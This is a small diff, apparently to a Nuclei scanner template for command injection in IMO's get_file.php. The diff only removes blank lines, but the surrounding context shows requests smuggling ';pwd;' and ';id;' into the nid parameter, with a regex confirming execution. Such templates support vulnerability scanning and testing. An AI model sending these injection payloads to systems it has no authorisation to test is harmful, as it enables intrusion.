@@ -16,7 +16,6 @@ info:
   metadata:
     max-request: 3
   tags: imo,rce
-
 flow: http(1) && http(2)
 
 http:
@@ -39,7 +38,6 @@ http:
       - |
         GET /file/NDisk/get_file.php?cid=1&nid=;pwd; HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /file/NDisk/get_file.php?cid=1&nid=;id; HTTP/1.1
         Host: {{Hostname}}
@@ -55,4 +53,3 @@ http:
         part: body_2
         regex:
           - "uid=[0-9]+.*gid=[0-9]+.*"
-
